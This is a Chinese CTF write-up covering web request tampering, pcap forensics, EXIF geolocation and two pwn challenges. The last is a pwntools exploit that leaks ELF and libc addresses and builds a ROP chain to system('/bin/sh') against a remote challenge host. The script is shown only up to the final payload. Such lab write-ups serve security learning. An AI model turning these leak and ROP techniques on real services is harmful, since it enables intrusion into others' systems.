web

1 阿里纳斯追乌龟

在古希腊，英雄阿基里斯和一只乌龟赛跑。阿基里斯的速度是乌龟的十倍。比赛开始时，乌龟在阿基里斯前面100米。
芝诺悖论认为，当阿基里斯追到乌龟的出发点时，乌龟已经又向前爬了一段距离。当阿基里斯再追到那个位置时，乌龟又向前爬了。如此无限循环，阿基里斯似乎永远也追不上乌龟。他真的追不上吗？

解法：进入环境，会发现有一个追赶button, 用burpsuite抓包后得到一段 base64加密 的data, 解密后修改前面的值大于后面的值即可拿到flag。

1 HTTP

管理员抓到一段可疑的流量，请从中还原被窃取的信息。

解法：下载pcapng附件, 使用wireshark打开, 发现存在三个带有参数d, s, r的三个GET请求 , 仔细观察可以发现d的参数是base64加密后的flag, 分别对U1lDe1JfVV9BXw==, RjBSM05TMUM1, X01BU1RFUj99, 进行解码, 拼接后就是flag。

2 🗃️🗃️

GSBP师傅在外出比赛结束后，打算到当地景点游览一番，他到了一个景点之后，感觉环境非常不错，
让人心旷神怡，于是拍了张图片发到了社交媒体。你是一名小黑客，你能找到他现在在哪里吗?
flag为SYC{城市_景点名称}
示例：SYC{成都市_武侯祠}

解法：用exiftool查看png图片的GPS定位信息， 发现位于39 deg 52’ 47.32” N, 116 deg 23’ 58.36” E，直接用高德地图定位，得到北京市天坛公园。

3 Mission Cipher Text

别来无恙，特工！我知道你前些日子在Dr.K的测试上的事情了，别担心，>Dr.K发觉了你惊人的天赋，现在你正式成为0Geek的高级特工了！
那么紧接着就是你的第一项任务：攻破“公司”的废弃节点。
仔细听任务简报：我们的其他特工曾经入侵过该节点，当时这个节点就已经因为未知原因被废弃了。不过最近我们丢失了该节点的控制权。测试发现这个节点现在【停止了一切对外访问】的活动，我们怀疑是有其他人入侵了这个节点。
特工，现在派遣你去确认情况，重新控制该节点。

解法：先查看函数表，发现有backdoor函数，在菜单界面选择2后覆写返回地址（此处有栈对齐问题），发现程序把stdout close了，无法输出命令执行结果，此时可以在命令后加上1>&2，用stderr来输出执行结果，如ls 1>&2即可返回当前目录。

解法：ida反汇编，看到该程序一共有3个功能，1是注册：

需要注意到此处是否注册是通过*((_DWORD *)ptr + 12)处的值判断的，当其不等于-1时为已注册。注册后会在*((_QWORD *)ptr + 7)处存放puts的got表地址。同时还要注意到 此处read有40个字节，足以覆盖*((_DWORD *)ptr + 12)处的值，利用该点可以在后面的3中读取到puts的地址。

3是view_resources：

此处的login()不影响后面的判断，故可以无视。
此处以*((_DWORD *)ptr + 12)作为是否注册的依据，联系前面1中的溢出，我们可以在程序一开始直接调用3，ptr处的值其实就是u的地址，即存放username，password的地址，可以利用它算出elf文件的基址，同时注册后利用密码溢出覆写 *((_DWORD *)ptr + 12)处的值为0，这样就可以利用puts的地址算出libc基址，最后利用2中的栈溢出漏洞get shell。

from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')

#p = process('./pwn')
p = remote('geek.ctfplus.cn',30754)
p.recvuntil('choice >> ')
p.sendline(b'3')
p.recvuntil('WELCOME, USER.\n')
elf_base = u64(p.recv(6).ljust(8,b'\x00')) - 0x4080
print(hex(elf_base))
#register
p.recvuntil('choice >> ')
p.sendline(b'1')
p.recvuntil('your name:\n')
p.sendline(b'lucky')
p.recvuntil('password:')
payload = b'a' * 32 + b'\x00'
p.send(payload)

p.recvuntil('choice >> ')
p.sendline(b'3')
p.recvuntil('your password:')
p.send(b'a' * 32)
p.recvuntil('ADMINISTRATOR.\n')
puts_addr = u64(p.recv(8))
libc_base = puts_addr - 0x80ed0

pop_rdi_ret = 0x2a3e5 + libc_base
system_addr = 0x50d60 + libc_base
bin_sh_addr = 0x1d8698 + libc_base
ret_addr = elf_base + 0x101a

p.recvuntil('choice >> ')
p.sendline(b'2')
p.recvuntil('feedback:')
payload2 = b'a' * 24 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret_addr) + p64(system_addr)
